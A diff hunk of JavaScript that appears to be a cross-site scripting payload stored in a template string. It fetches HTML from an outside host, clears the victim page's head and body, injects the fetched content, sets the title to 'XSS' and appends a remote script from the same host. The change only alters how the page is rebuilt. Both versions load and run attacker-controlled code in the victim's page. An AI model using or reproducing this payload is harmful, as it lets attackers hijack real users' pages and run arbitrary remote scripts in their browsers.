@@ -39,33 +39,34 @@ fetch('https://data.estebanmf.space/xss')
 .then(t => t.text())
 .then(d => {
 console.log('Fetched HTML:', d);
-// Clear existing document
-while (document.documentElement.firstChild) {
-document.documentElement.removeChild(document.documentElement.firstChild);
+// Use existing <html> element
+const html = document.documentElement;
+// Clear existing <head> and <body>
+const head = document.head || document.querySelector('head');
+const body = document.body || document.querySelector('body');
+while (head.firstChild) {
+head.removeChild(head.firstChild);
 }
-// Create <html> structure
-const html = document.createElement('html');
-const head = document.createElement('head');
+while (body.firstChild) {
+body.removeChild(body.firstChild);
+}
+// Set <title> in <head>
 const title = document.createElement('title');
 title.textContent = 'XSS';
 head.appendChild(title);
 // Parse fetched body content into a temporary container
 const tempDiv = document.createElement('div');
 tempDiv.innerHTML = d; // Temporary use of innerHTML to parse
-const body = tempDiv.querySelector('body') || document.createElement('body');
-// Move body children to new body element
-while (tempDiv.firstChild) {
-body.appendChild(tempDiv.firstChild);
+const fetchedBody = tempDiv.querySelector('body') || tempDiv;
+// Move body children to existing <body> element
+while (fetchedBody.firstChild) {
+body.appendChild(fetchedBody.firstChild);
 }
-// Create script tag for xss-script.js
+// Create and append script tag for xss-script.js
 const script = document.createElement('script');
 script.src = 'https://data.estebanmf.space/xss-script.js';
 body.appendChild(script);
-// Assemble document
-html.appendChild(head);
-html.appendChild(body);
-document.appendChild(html);
-console.log('DOM manually constructed and script appended');
+console.log('Existing DOM updated and script appended');
 })
 .catch(e => console.error('Fetch error:', e));
 `;
